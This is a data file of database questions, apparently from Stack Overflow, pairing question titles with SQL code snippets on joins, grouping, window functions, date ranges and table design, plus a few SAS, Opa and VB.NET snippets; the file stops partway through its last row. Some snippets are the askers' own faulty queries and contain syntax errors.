1202,56168,Explanation behind this (working) query?,"LEFT JOIN Contacts as c2 ON cl.clientId = c2.clientId AND c1.added < c2.added
WHERE c2.added IS NULL
"
6706,31017,Find the second appointment date per customer,";WITH ranked AS (
  SELECT
    CustomerId,
    AppointmentId,
    AppointmentDate,
    VisitNumber = ROW_NUMBER() OVER (PARTITION BY CustomerId
                                         ORDER BY AppointmentDate)
  FROM AppointmentDates
)
SELECT
  CustomerId,
  AppointmentId,
  AppointmentDate
FROM ranked
WHERE VisitNumber     =  @visitNumber
  AND AppointmentDate >= @startDate
  AND AppointmentDate <  @endDate
"
18421,3110,How to connect to Oracle in go,"prefix=/devel/target/1.0
exec_prefix=${prefix}
libdir=C:/oracle/instantclient_12_1_64/sdk/lib/msvc
includedir=C:/oracle/instantclient_12_1_64/sdk/include
oralib=C:/oracle/instantclient_12_1_64/sdk/lib/msvc
orainclude=C:/oracle/instantclient_12_1_64/sdk/include
gcclib=c:/MinGW_64/mingw64/lib
gccinclude=c:/MinGW_64/mingw64/lib
glib_genmarshal=glib-genmarshal
gobject_query=gobject-query
glib_mkenums=glib-mkenums
Name: oci8
Version: 12.1
Description: oci8 library
Libs: -L${oralib} -L${gcclib} -loci
Libs.private:
Cflags: -I${orainclude} -I${gccinclude}
"
26159,59190,SQL - Select distinct rows and join them with another table to get data,"SELECT p.person_id AS person_id, p.name AS name FROM person p, cars c    
WHERE p.person_id = c.person_id    
GROUP BY b.brand_id
"
6906,69113,How to calculate the percentage of total that meet a certain condition in Spark SQL,"SELECT
    NAME
    , COUNT(*) AS Total
    , SUM(CASE WHEN Value >= 10 THEN 1 ELSE 0 END) AS ""With Value >= 10""
    , (COUNT(*) * 1.0 /SUM(CASE WHEN Value >= 10 THEN 1 ELSE 0 END)) * 100
FROM <table>
GROUP BY NAME
"
31281,13359,How can I get the month number (not month name) from a date in SQL Server?,"SELECT DATEPART(m, getdate())
"
24337,50959,Find data within specific dates?,"SELECT * 
FROM
(
    SELECT EmployeeNumber, COUNT(1) AS TotalAmountOfVisitor 
    FROM X 
    WHERE VisitDate BETWEEN '2010-01-01' AND '2010-01-31 23:59:59'
    GROUP BY EmployeeNumber
) AS RefTable
INNER JOIN Y ON RefTable.EmployeeNumber = Y.EmployeeNumber
"
39183,4489,How can I write a self join that combines rows based on the value of a column?,"SELECT
    account_id,
    MAX(CASE WHEN profile_name = 'one' THEN distributor_id END) as distributor_one_id,
    MAX(CASE WHEN profile_name = 'two' THEN distributor_id END) as distributor_two_id,
    MAX(CASE WHEN profile_name = 'three' THEN distributor_id END) as distributor_three_id
FROM tbl
GROUP BY account_id
"
6323,53640,MySQL intersection in subquery,"select a.*
from apartments a
join apartments_features f1 
on a.apartment_id = f1.apartment_id and f1.feature_id in (103,106) -- applicable features
where not exists
(select null from apartments_features f2
 where a.apartment_id = f2.apartment_id and f2.feature_id in (105,107) ) -- excluded features
group by f1.apartment_id
having count(*) = 2 -- number of applicable features
"
23195,25791,Postgres-update char column for spesifc string,"UPDATE my_table
SET tel = '0' || left(tel, -2)
WHERE right(tel, 2) = '.0';
"
36897,27404,SQL Count Totals Within Date Ranges,"SELECT date(created_at) as CREATED_AT, sum(value) as TOTAL
FROM changes
WHERE created_at >= curdate() - interval 30 day
GROUP BY date(created_at);
"
23490,62775,Best way to randomly select rows *per* column in SQL Server,";With F AS
(
  SELECT TOP 100
    FirstName, ROW_NUMBER() OVER (ORDER BY NEWID()) AS Foo
  FROM Customer
), L AS
(
  SELECT TOP 100
    LastName, ROW_NUMBER() OVER (ORDER BY NEWID()) AS Foo
  FROM Customer
), S AS
(
  SELECT TOP 100
    State, ROW_NUMBER() OVER (ORDER BY NEWID()) AS Foo
  FROM Customer
)
SELECT
   F.FirstName, L.LastName, S.State
FROM
   F
   JOIN L ON F.Foo = L.Foo
   JOIN S ON F.Foo = S.Foo
"
10116,39248,Sum SQL PLUS function,"SELECT Article.noArticle, SUM (quantity) AS TOTALQUANTITY
FROM Article
LEFT JOIN LigneCommande ON Article.noArticle=LigneCommande.noArticle
GROUP BY ROLLUP( Article.noArticle)
"
17883,50029,Return a value if no rows are found SQL,"SELECT CASE WHEN COUNT(1) > 0 THEN 1 ELSE 0 END AS [Value]

FROM Sites S

WHERE S.Id = @SiteId and S.Status = 1 AND 
      (S.WebUserId = @WebUserId OR S.AllowUploads = 1)
"
39834,6587,"Access 2013, SQL, Update one row rather than one column","UPDATE tbl1 
INNER JOIN tbl2
ON tbl2.ID = tbl1.ID 
SET tbl1.Field1 = [Forms]![Project Details]![txtCustomerName], 
tbl1.Field2 = [Forms]![Project Details]![txtCustomerNumber]
;
"
12208,11367,How do I Separate One Column values into Multiple rows based on condition in SQL,";with CTE as(
    SELECT Date
        ,case when Type = 'A' then 'A' else '-' end as 'Type_1'
        , case when Type = 'B' then 'B' else '-' end as 'Type_2'
        , case when Type = 'C' then 'C' else '-' end as 'Type_3'
    FROM RegistrationReport
)

select cast(Date as varchar(20))Date
    ,Type_1
    ,Type_2
    ,Type_3
from CTE
UNION ALL
SELECT 'Total:'
    ,CAST(SUM(case when Type_1= 'A' then 1 else 0 end)as varchar(10))
    ,CAST(SUM(case when Type_2= 'B' then 1 else 0 end)as varchar(10))
    ,CAST(SUM(case when Type_3= 'C' then 1 else 0 end) as varchar(10))
FROM CTE
"
10323,48500,How to search a image/varbinary field for records that start with a binary pattern,"SELECT [cpclid] 
FROM [cp]
where cast(cpphoto as varbinary(4)) <> 0xFFD8FFE0
"
35071,30282,I have a select query that gets me a single column as a result. Now I need to put all those column values in CSV format,"SELECT GROUP_CONCAT(timesheet_ID) as TimeList
FROM   tableName
INTO   OUTFILE '/tmp/timeIDList.csv'  -- file output path
FIELDS TERMINATED BY ','
ENCLOSED BY '""'
LINES TERMINATED BY '\n'
"
6394,41521,Alternative in using Excel in reporting,"SELECT SUM(DealAmount) where DealDate Between X and Y 
"
14529,54966,SQL Update row by row,"   Update Table Set 
     Priority = (Select Count(*) From table 
                 Where Start_Date <= T.Start_Date)
   From Table T
   Where Start_Date > getDate()
"
34354,31456,Select Items that don't have matching Items in another table,"SELECT * 
FROM items
LEFT JOIN   //left join
readStatus
ON  items.itemId = readStatus.itemId
WHERE (readStatus.status != 1 OR readStatus.status IS NULL);
"
29477,23639,Can we make middle table to simplify query,"With TableC as 
( SELECT ....
)
SELECT * from tableA, tableB, tableC
WHERE condition
"
19236,54406,How to get row of unique value in MS SQL table?,"CREATE TABLE TestTable(Column1 INT,Column2 VARCHAR(100));
INSERT INTO TestTable VALUES
 (1001,'ab')
,(1001,'abc')
,(1001,'abcd')
,(2001,'wxyz')
,(2001,'xyz')
,(2001,'yz');

SELECT *
FROM TestTable
WHERE NOT EXISTS(SELECT 1 
                 FROM TestTable AS x 
                 WHERE x.Column1=TestTable.Column1 
                   AND LEN(x.Column2)>LEN(TestTable.Column2)
                   AND x.Column2 LIKE  '%' + TestTable.Column2  + '%'
                )

DROP TABLE TestTable;
"
32959,25098,How to write a complicated group by query in Oracle?,"with data_k as ( select id 
                      , count(distinct key) no_of_key
               from your_table
                group by id )
     , data_v as ( select id 
                      , value
                      , count(*) no_of_value
               from your_table
                group by id, value )
select distinct data_k.id
       , data_v.value
       , data_k.no_of_key 
       , data_v.no_of_value
from data_k
     join data_v on (data_k.id = data_v.id)
where data_k.no_of_key = data_v.no_of_value
order by data_k.id, data_v.value;
"
21363,24829,SQL query to indicate presence of a corresponding row,"select a.*,
       (case when 0 = (select count(*) from b where b.aid = a.aid)
             then 'N'
             else 'Y'
        end) as hasRowInB
from a
"
23751,30221,How to Get Data in Descending order using group by in mysql,"SELECT   player_messages.*
FROM     player_messages
WHERE    (receiver_user_id, sender_user_id, insertdate) IN (
           SELECT   receiver_user_id, sender_user_id, MAX(insertdate)
           FROM     player_messages
           WHERE    receiver_user_id='33'
           GROUP BY receiver_user_id, sender_user_id)
ORDER BY player_messages.insertdate DESC
"
33073,14216,Query to use column data as column name,"select
  case when stage = 'Stage 1' then name end 'Stage 1',
  case when stage = 'Stage 2' then name end 'Stage 2',
  case when stage = 'Stage 3' then name end 'Stage 3'
  from table1;
"
22911,69994,Need help with odd Access query,"select
      t.Description,
      emp.FullName,
      et.ScheduledDate
   from
      trainings t
         join employees emp
            left join EmployeeTrainings et
               on emp.EmployeeID = et.EmployeeID
               AND et.TrainingID = t.TrainingID
   where
      t.TrainingID IN ( 1, 3 )
   order by
      t.Description,
      emp.FullName
"
3958,61280,Fill null values with last non-null amount - Oracle SQL,"select item, year, month, amount, 
       last_value(amount ignore nulls) 
         over(partition by item 
              order by year, month 
              rows between unbounded preceding and 1 preceding) from tab;
"
39037,45895,Group rows into sequences using a sliding window on a DateTime column,"CREATE TABLE #Input (Id INT, Name VARCHAR(20), Time_stamp TIME)
INSERT INTO #Input
VALUES
(  1 ,'test','00:00:00'  ),
(  2 ,'test','00:06:00'  ),
(  3 ,'test','00:10:00'  ),
(  4 ,'test','00:14:00'  )

SELECT * FROM #Input;

WITH cte AS -- add a sequential number
(
    SELECT *, 
    ROW_NUMBER() OVER(ORDER BY Id) AS sort
    FROM #Input
), cte2 as -- find the Id's with a difference of more than 5min 
(
    SELECT cte.*,
    CASE WHEN DATEDIFF(MI, cte_1.Time_stamp,cte.Time_stamp) < 5 THEN 0 ELSE 1 END as GrpType
    FROM cte
    LEFT OUTER JOIN 
    cte as cte_1 on cte.sort =cte_1.sort +1
), cte3 as -- assign a SeqId
(
    SELECT GrpType, Time_Stamp,ROW_NUMBER() OVER(ORDER BY Time_stamp) SeqId
    FROM cte2 
    WHERE GrpType = 1

), cte4 as -- find the Time_Stamp range per SeqId
(
    SELECT cte3.*,cte_2.Time_stamp as TS_to
    FROM cte3
    LEFT OUTER JOIN 
    cte3 as cte_2 on cte3.SeqId =cte_2.SeqId -1
)
-- final query
SELECT 
    t.Id, 
    cte4.SeqId, 
    ROW_NUMBER() OVER(PARTITION BY cte4.SeqId ORDER BY t.Time_stamp) AS SeqOrder
FROM cte4 INNER JOIN #Input t ON t.Time_stamp>=cte4.Time_stamp AND (t.Time_stamp <cte4.TS_to OR  cte4.TS_to IS NULL);
"
24811,60417,MySQL SELECT with an extra column containing a string,"SELECT id, col1, col2, '12:48' AS tempCol
"
773,57905,How does SQL Server handle the following query?,"SELECT u.UserId,
       u.FullName,
       u.Location
FROM   [User] U
WHERE  NOT EXISTS (SELECT 1
                   FROM   ClubSponsorRelation csr
                   WHERE  u.UserId = csr.SponsorId
                   AND    csr.ClubId = @clubId)
       AND u.UserType = 'Sponsor' 
"
34349,60237,Accessing data in table pointed to by foreign key,"select s1.first_name, s2.first_name
from Friend   f 
join Student s1 on s1.idStudent = f.idStudent1
join Student s2 on s2.idStudent = f.idStudent2;
"
31648,41003,Double count within a table,"SELECT u.user_id, u.name, count(a.user_id) as howmany 
FROM users u LEFT OUTER JOIN associates a 
ON a.user_id = u.user_id
GROUP BY u.user_id 
ORDER BY u.user_id ASC
"
8378,33633,Another way to improve the SQL Query to avoid union?,"SELECT DISTINCT
  shops.*,
  DA.delivery_cost,
  DA.postcode AS AreaPostcode
FROM
  shops
INNER JOIN
  shops_delivery_area as DA
    ON (DA.shop_id = shops.id)
WHERE
  (DA.postcode = ""Liverpool"")
OR
  (DA.postcode = shops.postcode AND shops.location = ""Liverpool"")
"
21710,8341,"SQL search, search for a|b|c|d in a table and return results ordered by number of elements in the record","select 
    day_name, count(day_name) qty
from
    actions
where 
    name in ('eat', 'sleep', 'write', 'drink')
group by day_name
order by qty desc
"
25956,54961,Opa : passing database as function parameters,"database int /db1;
database int /db2;

function add(db, int i)
{
    Db.write(db, i)
}

add(@/db1, 12)
add(@/db2, 42)
"
1707,47778,Join the related entity table if a condition met?,"SELECT @P = CASE @LanguageID WHEN 0 THEN PT.Name ELSE P.Name END
FROM ProductTypes P 
LEFT JOIN ProductTypesTranslations PT On P.ID = PT.ProductTypeID 
                                         AND @LanguageID = 0 
WHERE P.ID = 88
"
17886,38015,sql server datetime hourly interval,"CREATE TABLE LoginTracking(
    AttemptDate     DATETIME,
    AttemptResult   VARCHAR(10)
)

INSERT INTO LoginTracking VALUES
('2007-12-18 14:33:24.000', 'LOGOUT'),
('2007-12-18 14:33:38.000', 'SUCCESS'),
('2007-12-18 14:35:36.000', 'LOGOUT'),
('2007-12-18 14:46:50.000', 'SUCCESS'),
('2007-12-18 16:52:48.000', 'TIMEOUT'),
('2007-12-18 16:57:33.000', 'SUCCESS'),
('2007-12-18 18:49:49.000', 'TIMEOUT'),
('2008-01-10 13:02:32.000', 'SUCCESS');

;WITH CteCross AS(
    SELECT
        lt.AttemptDate,
        N = x.N - 1
    FROM(
        SELECT DISTINCT 
            CAST(AttemptDate AS DATE) AS AttemptDate
        FROM LoginTracking
    )lt
    CROSS JOIN(
        SELECT 1  UNION ALL SELECT 2  UNION ALL SELECT 3  UNION ALL SELECT 4  UNION ALL SELECT 5 UNION ALL 
        SELECT 6  UNION ALL SELECT 7  UNION ALL SELECT 8  UNION ALL SELECT 9  UNION ALL SELECT 10 UNION ALL 
        SELECT 11 UNION ALL SELECT 12 UNION ALL SELECT 13 UNION ALL SELECT 14 UNION ALL SELECT 15 UNION ALL
        SELECT 16 UNION ALL SELECT 17 UNION ALL SELECT 18 UNION ALL SELECT 19 UNION ALL SELECT 20 UNION ALL
        SELECT 21 UNION ALL SELECT 22 UNION ALL SELECT 23 UNION ALL SELECT 24 
    )x(N)
)
SELECT 
    AttemptDate = DATEADD(HOUR, cc.N, CAST(cc.AttemptDate AS DATETIME)),
    LoginCount = SUM(CASE WHEN lt.AttemptResult = 'SUCCESS' THEN 1 ELSE 0 END)
FROM CteCross cc
LEFT JOIN LoginTracking lt
    ON CAST(lt.AttemptDate AS DATE) = cc.AttemptDate
    AND DATEPART(HOUR, lt.AttemptDate) = cc.N
GROUP BY cc.AttemptDate, cc.N
ORDER BY AttemptDate


DROP TABLE LoginTracking
"
38057,66036,SAS - Select from multiple records with same id but different status,"data have;
input UserId Order Status :$11.;
datalines;
1         1        completed
1         2        completed
1         3        incompleted
2         1        incompleted
2         2        incompleted
;
run;

proc sort data=have;
by userid order;
run;

data want (keep=userid);
set have;
by userid;
if first.userid then num_complete=0;
num_complete+(status='completed');
if last.userid and num_complete=0 then output;
run;
"
10698,29208,Database design problem,"Building
  BuildingId   pk
  BuildingName
  etc

Area
  AreaId      pk
  AreaName
  BuildIngId  fk -> Building  
  etc

Location
  LocationId         pk
  LocationType (LiveMonitor, Logger, Handprobe)  pk
  LocationName
  AreaId       fk -> Area
  etc

LiveMonitorLocation
  LocationId  pk, fk -> Location
  LocationType ConstantValue = LiveMonitor  fk ->  Location    

LoggerLocation
  LocationId   pk, fk -> Location
  LocationType ConstantValue = Logger  fk ->  Location    


HandprobeLocation
  LocationId   pk, fk -> Location
  LocationType ConstantValue = Handprobe fk ->  Location    

Logger
  LoggerId     pk
  LocationId   fk -> LoggerLocation
  SensorId     fk -> Sensor

Handprobe
  HandProbeId  pk
  Locationid  fk -> HandprobeLocation

Sensor
  SensorId     pk

LiveMonitorSensors
  SensorId     pk, fk -> Sensor
  LocationId   pk, fk -> LiveMonitorLocation

SensorReadings
  SensorId     pk, fk -> Sensor
  ReadingUtc   pk
  ReadingValue data
"
24433,32252,MySQL: Modifying output of a field for calculation,"select str_to_date( appu_dob, '%m/%d/%Y' ) as 'dob';
"
20148,15741,How to check if a temporary table is existing in Database,"if object_id('tempdb..#myTempTable') is not null
    drop table #myTempTable
"
10353,28469,Writing a Profiler query,"Use master
Go

Alter procedure dbo.NS_sp_profilerQuery
    @dbName sysname='',
    @userName sysname=Null,
    @hostName sysname=Null,
    @Seconds int
As
Begin

    Declare @SnapShots Table(
    idProceso int,
    idThread int,
    basedatos sysname, 
    usuario sysname, 
    cpu int, 
    hostname sysname, 
    espera sysname, 
    bloqueadoPor int, 
    Query Nvarchar(Max)
);

Declare @Profiler Table(
    idProceso int,
    idThread int,
    basedatos sysname, 
    usuario sysname, 
    cpu int, 
    hostname sysname, 
    espera sysname, 
    bloqueadoPor int, 
    Query Nvarchar(Max)
);

--Paso 1. Declaración de variables.
Declare @idDb Int=DB_ID(@dbName);
Declare @Query Nvarchar(Max);
Declare @HoraFinal Datetime=DateAdd(Second,@Seconds,Getdate());

While Getdate()<=@HoraFinal
Begin
    --Paso 2. Seteo de consulta.
    Select @Query = N'Select '+
    N'idProceso=syp.spid,idThread=syp.kpid,basedatos=DB_NAME(syp.dbid),usuario=syp.loginame,cpu,hostname,espera=lastwaittype,[bloqueadoPor]=blocked,Query=(Select text from ::fn_get_sql(syp.sql_handle)) '+
    N'From master.dbo.sysprocesses syp '+
    N'Where 1=1 '+
    (case when @idDb is null then '' else 'and syp.dbid='+Ltrim(Rtrim(Str(@idDb))) end)+
    (case when @userName is null then '' else ' and Ltrim(Rtrim(syp.loginame))='+Quotename(Ltrim(Rtrim(@userName)),Char(39)) end)+
    (case when @hostName is null then '' else ' and Ltrim(Rtrim(syp.hostname))='+Quotename(Ltrim(Rtrim(@hostName)),Char(39)) end);

    --Paso 3. Consulta y retorno de datos.
    Insert Into @SnapShots(idProceso,idThread,basedatos,usuario,cpu,hostname,espera,bloqueadoPor,Query)
    Exec(@Query);

    Insert Into @Profiler(idProceso,idThread,basedatos,usuario,cpu,hostname,espera,bloqueadoPor,Query)
    Select 
        sna.idProceso,sna.idThread,sna.basedatos,sna.usuario,sna.cpu,sna.hostname,sna.espera,sna.bloqueadoPor,sna.Query 
    From @SnapShots sna
    Left Join @Profiler pro
        On (sna.idProceso=pro.idProceso and sna.idThread=pro.idThread)
    Where pro.idProceso is null;

    Delete From @SnapShots;
End

Select 
    idProceso,idThread,basedatos,usuario,cpu,hostname,espera,bloqueadoPor,Query
From @Profiler;

End
Go
"
2829,28657,How do I use T-SQL Group By with multiple tables?,"SELECT
    Supplier.SupplierID,
    COUNT(distinct Computers.ComputerID) as Computers,
    COUNT(distinct Displays.DisplayID) as Displays,
    COUNT(distinct Foos.FooID) as Foos,
    COUNT(distinct Bars.BarID) as Bars
FROM Supplier
LEFT OUTER JOIN Computers 
    ON Supplier.SupplierID = Computers.SupplierID
LEFT OUTER JOIN Displays 
    ON Supplier.SupplierID = Displays.SupplierID
LEFT OUTER JOIN Foos 
    ON Supplier.SupplierID = Foos.SupplierID
LEFT OUTER JOIN Bars 
    ON Supplier.SupplierID = Bars.SupplierID
GROUP BY
    Supplier.SupplierID
"
26274,8234,Using BETWEEN with a subquery postgres,"SELECT *
FROM   attendance a 
JOIN   bill b ON 
       a.attendance_date BETWEEN b.bill_fromdate AND b.bill_todate 
WHERE  a.employeeid = 25 AND AND b.bill_id = 21487
"
37886,19937,"mysql: export single row, but with all dependencies","Select * from table1 t1 
inner join table2 t2 on
t1.pk = t2.fk
inner join table3 t3 on
t2.pk = t3.fk
.......
where t1.pk = {pk id number} limit 0,1
"
12212,5692,MySQL Join on Subquery,"SELECT  a.*, b.*
FROM    tblResults a
        INNER JOIN tblTraceOutput b
            ON a.resultid = b.resultid
        INNER JOIN
        (
            SELECT  resultid, traceid, MAX(outputid) max_ID
            FROM    tblTraceOutput
            GROUP   BY resultid, traceid
        ) c ON  b.resultid = c.resultid AND
                b.traceid = c.traceid
                b.outputid = c.max_ID
WHERE   a.traceid = 48
ORDER   BY resultid
LIMIT   0, 20
"
31893,28981,Database as it is raw content,"(1)Create database in Phpmyadmin
(2)Create tabe1(table name )   
(3)Run this query 'ALTER TABLE table1 DISCARD TABLESPACE';
(4)Copy and paste  table1.ibd from your backup to xaamp->mysql->data->table1
(5)Then Run this query 'ALTER TABLE table1 IMPORT TABLESPACE';
"
2595,59248,"Different behaviour in ""order by"" clause: Oracle vs. PostgreSQL","select a, length(a) from foo order by a collate ""C"";
"
2104,33819,SQL Aggregation Query,"SELECT firstDate, Rank, SUM(vote) Votes
FROM (
    SELECT @first_date := CASE WHEN Rank = @prev_rank
                               THEN @first_date
                               ELSE Date
                          END firstDate,
           @prev_rank := Rank curRank,
           data.*
    FROM (SELECT @first_date := NULL, @prev_rank := NULL) init
    JOIN (SELECT Date, Rank, Vote
          FROM MyTable
          Order by Date) data
    ) grouped
GROUP BY firstDate, Rank
"
2460,8605,Neo4j - understanding cypher querying,"MATCH (tp: TPPRODUCT_VERSION {TPPRODUCTCODE: ""Z1115""})<-[:IS_TPBOMPARENT_OF]-(pv: PRODUCT_VERSION)
OPTIONAL MATCH (pv)<-[:IS_BOMPARENT_OF*..]-(parent: PRODUCT_VERSION)
RETURN parent, pv, tp
"
22166,60264,Like Wildcard from column value?,"SELECT * FROM Table WHERE @Var LIKE Wildcard 
"
15697,36621,Random sorting query Access,"Rs.Source = ""SELECT pk FROM TABLE ORDER BY Rnd(-Timer() * [pk]) Asc""
"
3767,41880,getting value from another table just for a cell for every row,"SELECT `Table 2`.`id2`, `Table 2`.`title`, `Table 3`.`name` 
    FROM `Table 2` 
    JOIN `Table 3` ON `Table 2`.`id3` = `Table 3`.`id3`
"
5073,39680,How to write a sql query to Sort or Group the dataset,"select t.*
from yourtable t
  join (
    select personid, 
      min(date_time) min_date_time
    from yourtable
    group by personid
    ) t2 on t.personid = t2.personid
order by t2.min_date_time, t.date_time
"
2518,71601,SQL insert into using Union should add only distinct values,"INSERT INTO  #temptable (intID1, intID2, intID3)
SELECT intID1,intID2,intID3 FROM TableA
EXCEPT
SELECT intID1,intID2,intID3 FROM #temptable
"
28301,8043,sql query to export row values from one SQL Server database to another,"update 
   [databaseB].dbo.[tableb]
set 
[databaseB].dbo.[tableb].value = [databaseA].dbo.[tablea].Value
From
[databaseA].dbo.[tablea]
WHERE 
  [databaseA].dbo.[tablea].uniqueConst =   [databaseb].dbo.[tableb].uniqueConst
"
37008,52901,Handle SQL SUM operator on varchar operands,"DECLARE @varCharColumn VARCHAR(MAX) = (SELECT TOP 1 varcharColumn FROM SomeTable)

IF (ISNUMERIC(@varCharColumn) = 1 )
BEGIN
    SELECT COUNT(varcharColumn) AS CountNumber, SUM(varcharColumn) AS SumNumber
    FROM SomeTable
END
ELSE 
BEGIN 
    SELECT COUNT(varcharColumn) AS CountNumber, -1 AS SumNumber
    FROM SomeTable
END
"
36778,67054,how to write this view,"create view CustomerOrders as
select c.customerid CustomerID, 
       max(c.customername) CustomerName,
       count(o.order_id) CustomerOrders,
       SUM(CASE WHEN o.isopen = 1 THEN 1 ELSE 0 END) OpenOrders
from customer c
left join orders o on c.customerid = o.customerid
group by c.id
"
31067,15564,get missing data from should be identical mysql tables,"SELECT * 
FROM t1 AS A 
LEFT JOIN t2 AS B ON A.one = B.one AND A.two = B.two AND A.three = B.three 
WHERE B.four IS NULL 
"
16719,37226,Normalizing values in SQL query,"select
    Projectid,
    avg(cast(foo as decimal(29, 2))) / max(avg(cast(foo as decimal(29, 2)))) over ()
from tbl1
group by Projectid
"
30371,64431,How do I search/query multiple tables to return a common result?,"SELECT Id, Name as Title, LEFT ([Description], 100) as Content, WebUserId 
FROM dbo.DiveSites
WHERE Status = 1 
    AND Name LIKE '%wre%'
UNION ALL    
SELECT Id, Title, LEFT ([Description], 100), WebUserId 
FROM dbo.Media
WHERE Status = 1 
    AND Title LIKE '%wre%'
"
13588,67011,Trigger with current date query/where clause,"SELECT COUNT (*) INTO num_check
FROM UMRISS u
WHERE mdsys.sdo_contains (u.shape, :NEW.point) = 'TRUE'
AND u.umr_datum = ( select max(d.;umr_datum) from UMRISS d );
"
12877,863,"Count by day, count by week, in a grouped select statement","SELECT dbo.Clients.Town AS Town, 
count(*) AS wkTotal, 
sum(CASE WHEN datepart(dayofyear, status_date) = DATEPART(dayofyear, getdate()) THEN 1 ELSE 0 END) AS dayTotal
FROM dbo.Clients 
WHERE dbo.Clients.Status LIKE 'Status 1%' AND 
datepart(week, GETDATE()) = datepart(week, dbo.Clients.Status_date)
AND YEAR(GETDATE())= YEAR(dbo.Clients.Status_date)
GROUP BY dbo.Clients.Town 
ORDER BY dbo.Clients.Town
"
9308,21674,Performance Issue when Updating Table from Another Table,"merge into old_customer_source t1
using (select t2.custid, t2.firstname, t2.lastname
         from  new_customer_source t2
      ) t2
 on (t1.custid = t2.custid)
when matched then
update set t1.firstname = t2.firstname, 
           t1.lastname = t2.lastname
;
"
13675,58103,how to compute value on columns with formula,"select case left(formula,1)
     when '/' then value / convert(float,stuff(formula,1,1,''))
     when '*' then value * convert(float,stuff(formula,1,1,''))
     when '+' then value + convert(float,stuff(formula,1,1,''))
     when '-' then value - convert(float,stuff(formula,1,1,''))
     when '%' then value % convert(float,stuff(formula,1,1,''))
   end as Result
from tbl
"
28519,29537,Oracle group by clause using nested function in the select statement,"select flight_number, p.capacity - count(b.passenger_id) as available_seats 
 from booking b, PLANES p, scheduled_flights sf
where b.date_of_flight = '16-Oct-2014' and depart_city = 'Sydney' and arrival_city = 'Perth'
  and flight_number = sf.flight_number
  and sf.airplane_serial = p.airplane_serial
  and b.date_of_flight = sf.date_of_flight
group by flight_number, p.capacity;
"
30971,42837,How to write a SQL query to generate a report,"  SELECT Name as 'Call name', 
         submitted as 'Proposals Submitted',
         SUM(CASE WHEN maxStatus > 1 THEN 1 ELSE 0 END) as 'Proposals Reviewed'
FROM
   (SELECT cfp.Name, 
    sum(case when ps.Status_ID = 1 then 1 else 0 end) as submitted,
    MAX(ps.Status_ID) as maxStatus
    FROM CALLS_FOR_PROPOSALS cfp
    LEFT JOIN PROPOSALS p on cfp.ID = p.CALL_ID
    LEFT JOIN PROPOSAL_STATUSES ps on ps.PROPOSAL_ID = p.ID
    GROUP BY cfp.Name) AS s

GROUP BY Name, submitted
"
21031,32311,How to determine if a variable has a special character using dual table on sql?,"SELECT REGEXP_INSTR('Test!ing','[^[:alnum:]]') FROM dual;
"
5991,35191,Merge value of two colums and insert in to another table in ms sql,"INSERT INTO T2 ([C1] ,[C2] ,[C3]) 
SELECT [C1] ,[C2] ,
    CONCAT([C1],'1400', 
        replicate('0', 4 - len(C2)) + cast (C2 as varchar)) as C3
FROM T1 
WHERE [Eligible]='Yes' ORDER  BY C1 ASC, C2 ASC
"
7412,25842,SQL apply sum avg conditionally,"SELECT index, CASE WHEN index IN (1, 3) THEN SUM(value) ELSE AVG(value) END
FROM yourTable
GROUP BY index
"
13527,51518,PostgreSQL - Determining the Percentage of a Total,"SELECT  100.0 * number / sum(number) over () as perc
FROM    mytable;
"
11763,7129,How to select values that already exists in column,"select key
from table
group by key
having count(*) > 1;
"
36247,1875,Retrieve List of all SPs with some condition,"select OBJECT_NAME(object_id) 
from sys.sql_modules
where  OBJECTPROPERTY(object_id,'IsProcedure') = 1 and 
    definition like '%StudentId%' 
"
17032,34085,GROUP BY LAST DATE MYSQL,"SELECT u.id, u.name, e.id, e.date, e.comment
FROM user u
LEFT JOIN (SELECT t1.*
  FROM visit t1
    LEFT JOIN visit t2
      ON t1.id_user = t2.id_user AND t1.date < t2.date
  WHERE t2.id_user IS NULL
  ) e ON e.id_user=u.id
"
9173,60984,MySQL Query to group by date range?,"select time_logged,
       date_format(start_date - interval 12 day, '%Y-%m') AS `month_logged`
from work_log
group by month_logged;
"
19073,28515,"Return BOM results in ""indented"" order","declare @Jobs as Table ( ParentJob VarChar(10), ComponentJob VarChar(10) );
insert into @Jobs ( ParentJob, ComponentJob ) values
  ( '1', '1a' ), ( '1', '1b' ), ( '1', '1c' ),
  ( '1a', '1a1' ), ( '1a', '1a2' ), ( '1b', '1b1' ), ( '1b', '1b2' ),
  ( '2', '2a' ), ( '2', '2b' );

select * from @Jobs;

with Roots as (
  -- Find and fudge the root jobs.
  --   Usually they are represented as children without parents, but here they are implied by the presence of children.
  select distinct 1 as Depth, ParentJob as RootJob, Cast( ParentJob as VarChar(1024) ) as Path, ParentJob, ParentJob as ComponentJob
    from @Jobs as J
    where not exists ( select 42 from @Jobs where ComponentJob = J.ParentJob ) ),
  BoM as (
  -- Anchor the indented BoM at the roots.
  select Depth, RootJob, Path, ParentJob, ComponentJob
    from Roots
  union all
  -- Add the components one level at a time.
  select BoM.Depth + 1, BoM.RootJob, Cast( BoM.Path + '»' + J.ComponentJob as VarChar(1024) ), J.ParentJob, J.ComponentJob
    from BoM inner join
      @Jobs as J on J.ParentJob = BoM.ComponentJob )
  -- Show the result with indentation.
  select *, Space( Depth * 2 ) + ComponentJob as IndentedJob
    from BoM
    order by ComponentJob
    option ( MaxRecursion 0 );
"
8728,43541,"Select a field from sql IF, otherwise select another","select
  third_id,
  case when other_id = second_id then first_id 
       when other_id = first_id  then second_id
  end as id
from my_table
where ....
"
26118,57442,DMVs to get index configuration information,"SELECT 'ClusteredIndexName' = SI.Name, 
       'TableName' = SO.Name, 
       'ColumCount' = IK.IndexColumnCount,
       'IsUnique' = CASE WHEN SI.is_unique = 0 THEN 'N' ELSE 'Y' END
       ,SI.type_desc
FROM SYS.INDEXES SI                 

JOIN SYS.OBJECTS SO                 -- Joining on SYS.OBJECTS to get the TableName
  ON SO.OBJECT_ID = SI.Object_ID

JOIN (                              -- Joining on a Derived view to work out how many columns exist on the clustered index 
        SELECT 'IndexColumnCount' = MAX(KEY_ORDINAL), OBJECT_ID, index_id
        FROM SYS.INDEX_COLUMNS
        GROUP BY OBJECT_ID, index_id       
     )  AS IK                       
  ON IK.object_id = SI.Object_ID
 AND IK.index_id = SI.index_id  

WHERE SI.type_desc = 'CLUSTERED'    and                 
   SI.OBJECT_ID NOT IN (SELECT OBJECT_ID 
               FROM SYS.ALL_OBJECTS
               WHERE TYPE = 'S')        -- Not system tables
  AND SO.Type = 'U'
  AND SO.is_ms_shipped = 0  
"
20333,61197,Button to delete line from combobox wich is stored in a .dat file,"Dim lines As String()

Private Sub load_combo()
    lines = System.IO.File.ReadAllLines(""C:\database.dat"")
    cmboxType.Items.Clear()
